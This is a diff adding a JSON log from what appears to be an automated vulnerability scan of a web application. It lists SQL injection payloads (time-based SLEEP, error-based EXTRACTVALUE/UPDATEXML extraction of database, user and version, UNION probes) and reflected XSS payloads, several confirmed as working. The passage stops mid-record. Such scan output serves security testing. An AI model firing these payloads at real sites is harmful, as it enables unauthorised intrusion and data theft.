@@ -1,0 +1,3368 @@
+[
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_time",
+    "type": "SQLI_TIME",
+    "family": "poc_original",
+    "payload": "12'; select sleep(5)#",
+    "vulnerable": false,
+    "reason": "no_delay (elapsed=0.39s)",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.391
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_time",
+    "type": "SQLI_TIME",
+    "family": "sleep_dash",
+    "payload": "test_'; SELECT SLEEP(5)-- -",
+    "vulnerable": false,
+    "reason": "no_delay (elapsed=0.39s)",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.39
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_time",
+    "type": "SQLI_TIME",
+    "family": "sleep_or",
+    "payload": "a' OR SLEEP(5)#",
+    "vulnerable": false,
+    "reason": "no_delay (elapsed=0.39s)",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.392
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_time",
+    "type": "SQLI_TIME",
+    "family": "if_sleep",
+    "payload": "x' AND IF(1=1,SLEEP(5),0)#",
+    "vulnerable": false,
+    "reason": "no_delay (elapsed=0.39s)",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.392
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_time",
+    "type": "SQLI_TIME",
+    "family": "sleep_subquery",
+    "payload": "x'; SELECT IF(1=1,SLEEP(5),0)#",
+    "vulnerable": false,
+    "reason": "no_delay (elapsed=0.39s)",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.391
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_error",
+    "type": "SQLI_ERROR",
+    "family": "extractvalue",
+    "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))#",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.391
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_error",
+    "type": "SQLI_ERROR",
+    "family": "updatexml",
+    "payload": "x' AND UPDATEXML(1,CONCAT(0x7e,version()),1)#",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.39
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_error",
+    "type": "SQLI_ERROR",
+    "family": "gtid_subset",
+    "payload": "x' AND GTID_SUBSET(CONCAT(0x7e,database()),0)#",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.39
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18662_install_sqli",
+    "vuln_type": "sqli_error",
+    "type": "SQLI_ERROR",
+    "family": "extractvalue_user",
+    "payload": "x' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))#",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 617,
+      "elapsed": 0.389
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 617,
+      "false_len": 617,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18662_install_sqli"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: '<script>alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3671,
+      "elapsed": 0.182
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3674,
+      "elapsed": 0.182
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onload=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3667,
+      "elapsed": 0.183
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "javascript_uri",
+    "payload": "javascript:alert(document.domain)",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 1489,
+      "elapsed": 0.181
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3676,
+      "elapsed": 0.183
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18661_login_xss",
+    "vuln_type": "xss_url",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onmouseover=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 3672,
+      "elapsed": 0.181
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18661_login_xss"
+  },
+  {
+    "point": "cve_18663_move_xss",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.396
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18663_move_xss"
+  },
+  {
+    "point": "cve_18663_move_xss",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.397
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18663_move_xss"
+  },
+  {
+    "point": "cve_18663_move_xss",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.396
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18663_move_xss"
+  },
+  {
+    "point": "cve_18663_move_xss",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.396
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18663_move_xss"
+  },
+  {
+    "point": "cve_18663_move_xss",
+    "vuln_type": "xss_move",
+    "type": "REFLECTED_XSS",
+    "family": "details_toggle",
+    "payload": "<details open ontoggle=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 2013,
+      "elapsed": 0.395
+    },
+    "xss_context": "none",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "cve_18663_move_xss"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_error",
+    "payload": "'1'='1",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7320,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_tautology",
+    "payload": "' OR '1'='1",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7355,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "time_sleep",
+    "payload": "' AND SLEEP(5)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_extract",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_update",
+    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_gtid",
+    "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "union_cols",
+    "payload": "' UNION SELECT NULL,NULL,NULL-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7363,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_user",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_search_stx_fix",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_version",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7356,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 7355,
+      "false_len": 7339,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_search_stx_fix"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_error",
+    "payload": "'1'='1",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7480,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_tautology",
+    "payload": "' OR '1'='1",
+    "vulnerable": true,
+    "reason": "boolean_TRUE_condition: resp=14579, ctrl_true=14579, ctrl_false=7500, signal=100.0%",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 14579,
+      "elapsed": 0.212
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "time_sleep",
+    "payload": "' AND SLEEP(5)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7456,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_extract",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax', 'extractvalue(']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7518,
+      "elapsed": 0.186
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_update",
+    "payload": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax', 'updatexml(']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7514,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_gtid",
+    "payload": "' AND GTID_SUBSET(CONCAT(0x7e,database()),0)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7516,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "union_probe",
+    "payload": "' UNION SELECT NULL,NULL,NULL-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7566,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "sqli_faq_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "error_user",
+    "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax', 'extractvalue(']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7510,
+      "elapsed": 0.185
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 14579,
+      "false_len": 7500,
+      "boolean_possible": true
+    },
+    "payload_source": "sqli_faq_stx"
+  },
+  {
+    "point": "xss_faq_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: '<script>alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 14602,
+      "elapsed": 0.201
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_faq_stx"
+  },
+  {
+    "point": "xss_faq_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 14587,
+      "elapsed": 0.199
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_faq_stx"
+  },
+  {
+    "point": "xss_faq_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onload=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 14567,
+      "elapsed": 0.202
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_faq_stx"
+  },
+  {
+    "point": "xss_faq_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 14614,
+      "elapsed": 0.198
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_faq_stx"
+  },
+  {
+    "point": "xss_faq_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onmouseover=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 14630,
+      "elapsed": 0.197
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_faq_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "script_basic",
+    "payload": "<script>alert(1)</script>",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17225,
+      "elapsed": 0.201
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "img_onerror",
+    "payload": "<img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17195,
+      "elapsed": 0.201
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "svg_onload",
+    "payload": "<svg onload=alert(1)>",
+    "vulnerable": false,
+    "reason": "xss_encoded: payload HTML-encoded (filtered)",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17154,
+      "elapsed": 0.203
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "value_breakout",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17260,
+      "elapsed": 0.201
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "onmouseover",
+    "payload": "\" onmouseover=alert(1) x=\"",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onmouseover=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17248,
+      "elapsed": 0.2
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "details_toggle",
+    "payload": "<details open ontoggle=alert(1)>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'ontoggle=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17211,
+      "elapsed": 0.201
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "backtick",
+    "payload": "\"><img src=x onerror=alert`1`>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=alert' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17260,
+      "elapsed": 0.199
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "entity_bypass",
+    "payload": "\" onmouseover&#61;alert(1) x=\"",
+    "vulnerable": false,
+    "reason": "xss_not_reflected",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17304,
+      "elapsed": 0.2
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "xss_board_stx",
+    "vuln_type": "xss_search",
+    "type": "REFLECTED_XSS",
+    "family": "eval_fromcharcode",
+    "payload": "\"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+    "vulnerable": true,
+    "reason": "xss_marker_unencoded: 'onerror=eval' found in response",
+    "mode": "xss",
+    "response": {
+      "status": 200,
+      "length": 17526,
+      "elapsed": 0.2
+    },
+    "xss_context": "attr_value",
+    "controls": {
+      "true_len": null,
+      "false_len": null,
+      "boolean_possible": false
+    },
+    "payload_source": "xss_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_error",
+    "payload": "'1'='1",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7459,
+      "elapsed": 0.2
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_tautology",
+    "payload": "' OR '1'='1",
+    "vulnerable": false,
+    "reason": "no_signal",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 17919,
+      "elapsed": 0.2
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "quote_comment",
+    "payload": "' OR 1=1-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7413,
+      "elapsed": 0.196
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
+    "vuln_type": "sqli_string",
+    "type": "SQLI_STRING",
+    "family": "time_sleep",
+    "payload": "' AND SLEEP(5)-- -",
+    "vulnerable": true,
+    "reason": "mysql_error: ['you have an error in your sql syntax']",
+    "mode": "sqli",
+    "response": {
+      "status": 200,
+      "length": 7419,
+      "elapsed": 0.198
+    },
+    "xss_context": null,
+    "controls": {
+      "true_len": 17114,
+      "false_len": 17114,
+      "boolean_possible": false
+    },
+    "payload_source": "sqli_board_stx"
+  },
+  {
+    "point": "sqli_board_stx",
